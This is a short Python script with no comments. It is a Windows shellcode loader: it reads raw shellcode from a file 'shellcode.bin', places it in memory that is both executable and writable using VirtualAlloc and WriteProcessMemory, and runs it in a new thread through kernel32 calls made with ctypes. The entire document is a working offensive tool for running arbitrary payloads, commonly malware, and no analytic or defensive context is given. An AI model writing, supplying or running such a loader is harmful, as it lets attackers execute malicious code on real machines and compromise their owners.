from ctypes import *
import struct

f = open("shellcode.bin", "rb")
shellcode = f.read()
f.close()
lenshellcode = len(shellcode)
ptr = windll.kernel32.VirtualAlloc(None, lenshellcode, 0x3000, 0x40)
hproc = windll.kernel32.OpenProcess(0x1F0FFF,False,windll.kernel32.GetCurrentProcessId())
windll.kernel32.WriteProcessMemory(hproc, ptr, shellcode, len(shellcode), byref(c_int(0)))
windll.kernel32.CreateThread(0,0,ptr,0,0,0)
windll.kernel32.WaitForSingleObject(c_int(-1), c_int(-1))